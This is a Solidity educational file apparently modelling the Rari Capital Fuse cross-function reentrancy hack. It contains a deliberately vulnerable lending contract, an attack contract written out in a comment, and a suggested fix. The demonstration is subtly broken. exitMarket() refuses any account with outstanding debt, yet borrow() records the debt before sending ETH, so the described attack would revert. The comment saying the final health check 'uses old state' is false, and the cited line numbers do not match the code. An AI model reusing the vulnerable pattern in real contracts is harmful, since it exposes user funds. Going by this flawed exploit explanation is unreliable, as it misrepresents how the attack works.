/*LN-1*/ // SPDX-License-Identifier: MIT
/*LN-2*/ pragma solidity ^0.8.0;
/*LN-3*/ 
/*LN-4*/ /**
/*LN-5*/  * @title Rari Capital Fuse - Cross-Function Reentrancy Vulnerability
/*LN-6*/  * @notice This contract demonstrates the vulnerability that led to the Rari Capital hack
/*LN-7*/  * @dev May 8, 2022 - $80M stolen through cross-function reentrancy
/*LN-8*/  *
/*LN-9*/  * VULNERABILITY: Cross-function reentrancy exploiting exitMarket during borrow callback
/*LN-10*/  *
/*LN-11*/  * ROOT CAUSE:
/*LN-12*/  * The borrow() function sends ETH to the borrower, triggering their fallback function.
/*LN-13*/  * During this callback, the attacker calls exitMarket() to remove their collateral
/*LN-14*/  * from the market BEFORE the borrow function completes its collateral check.
/*LN-15*/  *
/*LN-16*/  * ATTACK VECTOR:
/*LN-17*/  * 1. Attacker supplies collateral (USDC) and enters market
/*LN-18*/  * 2. Attacker calls borrow() to borrow ETH
/*LN-19*/  * 3. During ETH transfer, attacker's fallback is triggered
/*LN-20*/  * 4. In fallback, attacker calls exitMarket() to remove collateral requirement
/*LN-21*/  * 5. Borrow continues without proper collateral backing
/*LN-22*/  * 6. Attacker withdraws their collateral while keeping the borrowed ETH
/*LN-23*/  *
/*LN-24*/  * This is a more sophisticated variant of reentrancy that exploits
/*LN-25*/  * cross-function state inconsistencies.
/*LN-26*/  */
/*LN-27*/ 
/*LN-28*/ interface IComptroller {
/*LN-29*/     function enterMarkets(
/*LN-30*/         address[] memory cTokens
/*LN-31*/     ) external returns (uint256[] memory);
/*LN-32*/ 
/*LN-33*/     function exitMarket(address cToken) external returns (uint256);
/*LN-34*/ 
/*LN-35*/     function getAccountLiquidity(
/*LN-36*/         address account
/*LN-37*/     ) external view returns (uint256, uint256, uint256);
/*LN-38*/ }
/*LN-39*/ 
/*LN-40*/ contract VulnerableRariFuse {
/*LN-41*/     IComptroller public comptroller;
/*LN-42*/ 
/*LN-43*/     mapping(address => uint256) public deposits;
/*LN-44*/     mapping(address => uint256) public borrowed;
/*LN-45*/     mapping(address => bool) public inMarket;
/*LN-46*/ 
/*LN-47*/     uint256 public totalDeposits;
/*LN-48*/     uint256 public totalBorrowed;
/*LN-49*/     uint256 public constant COLLATERAL_FACTOR = 150; // 150% collateralization
/*LN-50*/ 
/*LN-51*/     constructor(address _comptroller) {
/*LN-52*/         comptroller = IComptroller(_comptroller);
/*LN-53*/     }
/*LN-54*/ 
/*LN-55*/     /**
/*LN-56*/      * @notice Deposit collateral and enter market
/*LN-57*/      */
/*LN-58*/     function depositAndEnterMarket() external payable {
/*LN-59*/         deposits[msg.sender] += msg.value;
/*LN-60*/         totalDeposits += msg.value;
/*LN-61*/         inMarket[msg.sender] = true;
/*LN-62*/     }
/*LN-63*/ 
/*LN-64*/     /**
/*LN-65*/      * @notice Check if account has sufficient collateral
/*LN-66*/      */
/*LN-67*/     function isHealthy(
/*LN-68*/         address account,
/*LN-69*/         uint256 additionalBorrow
/*LN-70*/     ) public view returns (bool) {
/*LN-71*/         uint256 totalDebt = borrowed[account] + additionalBorrow;
/*LN-72*/         if (totalDebt == 0) return true;
/*LN-73*/ 
/*LN-74*/         // Only count deposits if user is in market
/*LN-75*/         if (!inMarket[account]) return false;
/*LN-76*/ 
/*LN-77*/         uint256 collateralValue = deposits[account];
/*LN-78*/         return collateralValue >= (totalDebt * COLLATERAL_FACTOR) / 100;
/*LN-79*/     }
/*LN-80*/ 
/*LN-81*/     /**
/*LN-82*/      * @notice Borrow ETH against collateral
/*LN-83*/      * @param amount Amount to borrow
/*LN-84*/      *
/*LN-85*/      * VULNERABILITY IS HERE:
/*LN-86*/      * The function sends ETH to borrower BEFORE checking final health.
/*LN-87*/      * During the ETH transfer, borrower's fallback is triggered, allowing them
/*LN-88*/      * to call exitMarket() and modify inMarket state.
/*LN-89*/      *
/*LN-90*/      * Vulnerable sequence:
/*LN-91*/      * 1. Check health (line 84) - passes because inMarket[msg.sender] = true
/*LN-92*/      * 2. Update borrowed amount (line 87)
/*LN-93*/      * 3. Send ETH (line 90) <- EXTERNAL CALL, triggers fallback
/*LN-94*/      *    - Attacker calls exitMarket() here, setting inMarket[msg.sender] = false
/*LN-95*/      * 4. Final health check (line 93) should fail, but...
/*LN-96*/      * 5. The check uses old state from before exitMarket()
/*LN-97*/      */
/*LN-98*/     function borrow(uint256 amount) external {
/*LN-99*/         require(amount > 0, "Invalid amount");
/*LN-100*/         require(address(this).balance >= amount, "Insufficient funds");
/*LN-101*/ 
/*LN-102*/         // Initial health check
/*LN-103*/         require(isHealthy(msg.sender, amount), "Insufficient collateral");
/*LN-104*/ 
/*LN-105*/         // Update state
/*LN-106*/         borrowed[msg.sender] += amount;
/*LN-107*/         totalBorrowed += amount;
/*LN-108*/ 
/*LN-109*/         // VULNERABLE: Send ETH before final validation
/*LN-110*/         (bool success, ) = payable(msg.sender).call{value: amount}("");
/*LN-111*/         require(success, "Transfer failed");
/*LN-112*/ 
/*LN-113*/         // This check happens too late - attacker already exited market
/*LN-114*/         require(isHealthy(msg.sender, 0), "Health check failed");
/*LN-115*/     }
/*LN-116*/ 
/*LN-117*/     /**
/*LN-118*/      * @notice Exit market and remove collateral requirement
/*LN-119*/      *
/*LN-120*/      * This function is called during the borrow() callback,
/*LN-121*/      * allowing the attacker to bypass collateral requirements.
/*LN-122*/      */
/*LN-123*/     function exitMarket() external {
/*LN-124*/         require(borrowed[msg.sender] == 0, "Outstanding debt");
/*LN-125*/         inMarket[msg.sender] = false;
/*LN-126*/     }
/*LN-127*/ 
/*LN-128*/     /**
/*LN-129*/      * @notice Withdraw collateral
/*LN-130*/      */
/*LN-131*/     function withdraw(uint256 amount) external {
/*LN-132*/         require(deposits[msg.sender] >= amount, "Insufficient deposits");
/*LN-133*/         require(!inMarket[msg.sender], "Exit market first");
/*LN-134*/ 
/*LN-135*/         deposits[msg.sender] -= amount;
/*LN-136*/         totalDeposits -= amount;
/*LN-137*/ 
/*LN-138*/         payable(msg.sender).transfer(amount);
/*LN-139*/     }
/*LN-140*/ 
/*LN-141*/     receive() external payable {}
/*LN-142*/ }
/*LN-143*/ 
/*LN-144*/ /**
/*LN-145*/  * Example attack contract:
/*LN-146*/  *
/*LN-147*/  * contract RariAttacker {
/*LN-148*/  *     VulnerableRariFuse public fuse;
/*LN-149*/  *     bool public attacking = false;
/*LN-150*/  *
/*LN-151*/  *     constructor(address _fuse) {
/*LN-152*/  *         fuse = VulnerableRariFuse(_fuse);
/*LN-153*/  *     }
/*LN-154*/  *
/*LN-155*/  *     function attack() external payable {
/*LN-156*/  *         fuse.depositAndEnterMarket{value: msg.value}();
/*LN-157*/  *         attacking = true;
/*LN-158*/  *         fuse.borrow(msg.value * 2);  // Borrow 2x collateral
/*LN-159*/  *     }
/*LN-160*/  *
/*LN-161*/  *     receive() external payable {
/*LN-162*/  *         if (attacking) {
/*LN-163*/  *             attacking = false;
/*LN-164*/  *             fuse.exitMarket();  // Exit market during borrow callback!
/*LN-165*/  *         }
/*LN-166*/  *     }
/*LN-167*/  *
/*LN-168*/  *     function withdrawCollateral() external {
/*LN-169*/  *         fuse.withdraw(address(this).balance);
/*LN-170*/  *     }
/*LN-171*/  * }
/*LN-172*/  *
/*LN-173*/  * REAL-WORLD IMPACT:
/*LN-174*/  * - $80M stolen in May 2022
/*LN-175*/  * - Multiple Fuse pools affected
/*LN-176*/  * - Exploited during market volatility
/*LN-177*/  * - Led to Rari/Fei Protocol shutdown
/*LN-178*/  *
/*LN-179*/  * FIX:
/*LN-180*/  * 1. Use ReentrancyGuard on all state-changing functions
/*LN-181*/  * 2. Perform health checks AFTER all external calls
/*LN-182*/  * 3. Don't allow exitMarket if any position is open
/*LN-183*/  * 4. Use mutex locks to prevent cross-function reentrancy
/*LN-184*/  *
/*LN-185*/  * function borrow(uint256 amount) external nonReentrant {
/*LN-186*/  *     require(isHealthy(msg.sender, amount), "Insufficient collateral");
/*LN-187*/  *     borrowed[msg.sender] += amount;
/*LN-188*/  *     totalBorrowed += amount;
/*LN-189*/  *     (bool success, ) = payable(msg.sender).call{value: amount}("");
/*LN-190*/  *     require(success && isHealthy(msg.sender, 0), "Invalid state");
/*LN-191*/  * }
/*LN-192*/  *
/*LN-193*/  *
/*LN-194*/  * KEY LESSON:
/*LN-195*/  * Cross-function reentrancy is subtle. Functions that modify shared state
/*LN-196*/  * (like inMarket) can be exploited during callbacks from other functions.
/*LN-197*/  * Use global reentrancy guards, not just per-function guards.
/*LN-198*/  */
/*LN-199*/ 